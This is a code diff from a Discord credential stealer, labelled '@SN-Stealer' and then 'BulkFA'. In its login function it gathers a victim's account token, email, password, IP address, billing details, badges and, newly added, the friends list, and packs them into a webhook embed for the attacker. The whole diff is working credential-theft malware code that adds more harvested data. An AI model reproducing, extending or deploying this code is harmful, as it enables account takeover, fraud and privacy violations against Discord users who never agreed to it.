@@ -601,6 +601,7 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
+  const friends = await getFriends(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -609,41 +610,50 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
-            value: `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
+            name: '<a:944007295417843743:959785231982931979> Token:',
+            value: `\`${token}\` [Click to copy](https://superfurrycdn.nl/copy/{token})`,
             inline: false,
           },
           {
-            name: '<a:9574_Butterfly_Blue:985666963089014805> @SN - Email:',
-            value: `\`${email}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${email})`,
-            inline: true,
-          },
-          {
-            name: '<a:4536gun4:985673435860586557> @SN - Password:',
-            value: `\`${password}\`\n[Click = Copy](https://superfurrycdn.nl/copy/${password})`,
-            inline: true,
-          },
-          {
-            name: '<a:5211fireemojis:985667589961318430> @SN - IP:',
-            value: `\`${config.ip}\`\n[Click = Open](https://ipinfo.io/${ip})`,
-            inline: true,
-          },
-          {
-            name: '<:1205bluepawprints:985668463899050014> @SN - Badges Type:',
+            name: '<a:satanist:802503618972483615> Badges:',
             value: `${badges}`,
             inline: true,
           },
           {
-            name: '<a:6132lightblueheartspin:985668720422682724> @SN - Billing Type:',
-            value: `${billing}`,
+            name: '<:944007233820307467:959785232037470208> Billing:',
+            value: `**${billing}**`,
             inline: true,
-           },
+          },
+          {
+            name: '<:944007233820307467:959785232037470208> Friends:',
+            value: `\`${friends}\``,
+            inline: true,
+          },
+          {
+            name: '<:944007233820307467:959785232037470208> Email:',
+            value: `\`${email}\``,
+            inline: true,
+          },
+          {
+            name: '<:944007233820307467:959785232037470208> IP:',
+            value: `\`${config.ip}\``,
+            inline: true,
+          },
+          {
+            name: '<a:satan:846706207632261120> Password:',
+            value: `\`${password}\``,
+            inline: true,
+          },
         ],
-       author: {
-          name: json.username + '#' + json.discriminator + json.id,
+        author: {
+          name: json.username + '#' + json.discriminator + ' - ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '@SN-Stealer',
+          text: 'BulkFA',
+        },
+        thumbnail: {
+          url: 'https://media.discordapp.net/attachments/938721597748031568/939085296107155536/Picsart_22-01-16_16-47-19-734.jpg',
         },
       },
     ],
